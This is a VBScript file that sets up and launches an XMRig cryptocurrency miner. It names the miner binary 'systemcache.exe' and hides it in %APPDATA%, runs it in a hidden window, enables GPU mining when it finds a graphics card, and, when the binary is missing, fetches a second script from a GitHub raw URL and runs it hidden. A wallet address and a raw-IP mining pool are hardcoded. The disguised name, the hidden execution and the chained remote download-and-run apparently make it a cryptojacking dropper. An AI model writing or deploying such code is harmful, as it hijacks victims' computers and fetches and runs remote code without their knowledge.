' ========================
' 2_MinerConf.vbs — Main Miner Configuration and Launcher
' ========================

Option Explicit ' Enforce explicit declaration of all variables for better error detection

Dim shell, fso, exePath, arguments, logFile, cpuThreads, pool, wallet, password, gpuOption
Dim logFolder, downloaderURL

' --- Create necessary objects (Global scope) ---
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- Paths and URLs ---
' IMPORTANT: Adjust these paths as needed for your setup
exePath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner\xmrig-6.21.0\systemcache.exe" ' Standard APPDATA path
logFile = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner\miner.log"
logFolder = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner"
downloaderURL = "https://raw.githubusercontent.com/Mrx-coder-1157/mining-scripts/main/1_Downloader.vbs"

' --- Miner Configuration ---
' Adjust these values to your specific mining pool and wallet
cpuThreads = 1 ' Number of CPU threads to use (adjust based on your CPU cores)
wallet = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.worker1" ' Your wallet address and worker name
pool = "159.203.162.18:3333" ' Your mining pool address and port
password = "x" ' Pool password (often 'x' or blank)

' --- Script Start Logging ---
' Create log folder if it doesn't exist
If Not fso.FolderExists(logFolder) Then
    fso.CreateFolder logFolder
    LogToFile "Created miner log folder: " & logFolder
End If
LogToFile "⏳ Starting 2_MinerConf.vbs script..."

' --- Detect GPU ---
Dim gpuAvailable
gpuAvailable = DetectGPU()
If gpuAvailable Then
    gpuOption = "--opencl --cuda" ' Enable OpenCL and CUDA if a non-Intel GPU is detected
    LogToFile "✅ Non-Intel GPU detected. GPU mining enabled."
Else
    gpuOption = "" ' No GPU options if only Intel or no GPU
    LogToFile "🚫 No non-Intel GPU detected. GPU mining disabled."
End If

' --- Download miner if missing ---
If Not fso.FileExists(exePath) Then
    LogToFile "📥 Miner executable not found at " & exePath & ". Initiating download..."
    Download1DownloaderAndExecute() ' Call the sub to download and run 1_Downloader.vbs

    ' Wait for the miner executable to appear (max 60 seconds)
    Dim i
    LogToFile "⏱️ Waiting for systemcache.exe to appear after download/extraction (max 60s)..."
    For i = 1 To 60 ' Wait up to 60 seconds (adjust if downloads are very slow)
        If fso.FileExists(exePath) Then Exit For
        WScript.Sleep 1000 ' Wait 1 second
    Next

    If Not fso.FileExists(exePath) Then
        LogToFile "❌ Miner executable not found after waiting for download/extraction. Exiting."
        MsgBox "Miner executable (systemcache.exe) not found after attempted download and extraction. Please check miner.log for details.", vbCritical, "Execution Error"
        WScript.Quit ' Exit the script if miner not found
    Else
        LogToFile "✅ Miner executable found at " & exePath & "."
    End If
Else
    LogToFile "✅ Miner executable already exists at " & exePath & "."
End If

' --- Launch Miner ---
arguments = "--algo randomx --url " & pool & " --user " & wallet & " --pass " & password & _
            " --cpu-threads " & cpuThreads & " --log-file """ & logFile & """ --donate-level 1" & _
            " --no-color --print-time 60 --api-port 0 " & gpuOption

LogToFile "🚀 Attempting to launch miner with arguments: " & arguments
On Error Resume Next ' Use OERN for the shell.Run in case the exe path is invalid or blocked
shell.Run """" & exePath & """ " & arguments, 0, False ' 0 = Hidden window, False = Don't wait (run in background)
If Err.Number <> 0 Then
    LogToFile "❌ Error launching miner: " & Err.Description & " (Error Code: " & Err.Number & ")"
    MsgBox "Failed to launch miner executable. Error: " & Err.Description, vbCritical, "Launch Error"
Else
    LogToFile "✅ Miner launched successfully."
End If
On Error GoTo 0 ' Turn off OERN

' --- Script End Logging ---
LogToFile "🏁 2_MinerConf.vbs finished execution."
WScript.Quit ' End the script

' ===================================
' Subroutines and Functions
' ===================================

' --- Function: DetectGPU ---
' Attempts to detect if a dedicated (non-Intel integrated) GPU is present.
Function DetectGPU()
    On Error Resume Next ' Handle errors during WMI query
    Dim objWMI, colItems, objItem
    Set objWMI = GetObject("winmgmts:\\.\root\CIMV2")
    If Err.Number <> 0 Then ' Check if GetObject failed
        LogToFile "❌ WMI Error (DetectGPU): " & Err.Description
        DetectGPU = False
        On Error GoTo 0
        Exit Function
    End If

    Set colItems = objWMI.ExecQuery("Select * from Win32_VideoController")
    If Err.Number <> 0 Then ' Check if ExecQuery failed
        LogToFile "❌ WMI Query Error (DetectGPU): " & Err.Description
        DetectGPU = False
        On Error GoTo 0
        Exit Function
    End If

    DetectGPU = False ' Default to no dedicated GPU
    For Each objItem In colItems
        ' Exclude common Intel integrated graphics controllers
        If InStr(LCase(objItem.Name), "intel") = 0 Then
            ' Found a non-Intel video controller, assume it's a dedicated GPU
            DetectGPU = True
            LogToFile "➡️ Detected GPU: " & objItem.Name
            Exit For
        End If
    Next
    On Error GoTo 0 ' Turn off OERN
End Function

' --- Subroutine: LogToFile ---
' Appends a message with timestamp to the miner.log file.
Sub LogToFile(msg)
    On Error Resume Next ' Prevent script crash if logging fails
    Dim file
    ' Use '8' for ForAppending mode, 'True' to create the file if it doesn't exist
    Set file = fso.OpenTextFile(logFile, 8, True)
    If Err.Number = 0 Then
        file.WriteLine Now & " - [2_MinerConf] - " & msg
        file.Close
    Else
        ' Fallback: If logging to file fails, try to show a MsgBox (only for critical failures)
        ' This prevents infinite loops if MsgBox itself causes an error.
        ' MsgBox "FATAL: Could not write to log file! Error: " & Err.Description & vbCrLf & "Message: " & msg, vbCritical, "Logging Error"
    End If
    On Error GoTo 0
End Sub

' --- Subroutine: Download1DownloaderAndExecute ---
' Downloads 1_Downloader.vbs and then executes it.
Sub Download1DownloaderAndExecute()
    On Error Resume Next ' Handle errors during download process

    Dim http, binaryStream, tmpPath
    Set http = CreateObject("MSXML2.XMLHTTP")
    Set binaryStream = CreateObject("ADODB.Stream")

    ' Define path for the downloaded downloader script
    tmpPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\1_Downloader.vbs"

    LogToFile "Starting download of 1_Downloader.vbs from: " & downloaderURL

    http.Open "GET", downloaderURL, False ' Synchronous request
    http.Send

    If http.Status = 200 Then
        binaryStream.Type = 1 ' Binary mode
        binaryStream.Open
        binaryStream.Write http.ResponseBody
        binaryStream.SaveToFile tmpPath, 2 ' 2 = Overwrite if exists
        binaryStream.Close
        LogToFile "✅ 1_Downloader.vbs downloaded successfully to: " & tmpPath

        ' *** IMPORTANT: RUN THE DOWNLOADED SCRIPT TO GET THE MINER ***
        LogToFile "🚀 Executing 1_Downloader.vbs..."
        shell.Run "wscript.exe """ & tmpPath & """", 0, True ' 0 = Hidden, True = Wait for it to finish
        If Err.Number <> 0 Then
            LogToFile "❌ Error executing 1_Downloader.vbs: " & Err.Description & " (Error Code: " & Err.Number & ")"
            MsgBox "Failed to execute 1_Downloader.vbs. Error: " & Err.Description, vbCritical, "Execution Error"
        Else
            LogToFile "✅ 1_Downloader.vbs finished execution."
        End If

    Else
        LogToFile "❌ Failed to download 1_Downloader.vbs. HTTP Status: " & http.Status & " - " & http.StatusText
        MsgBox "Failed to download 1_Downloader.vbs from GitHub. HTTP Status: " & http.Status & vbCrLf & "Please check your internet connection or the GitHub URL.", vbCritical, "Download Error"
    End If

    ' Clean up objects
    Set http = Nothing
    Set binaryStream = Nothing
    On Error GoTo 0
End Sub
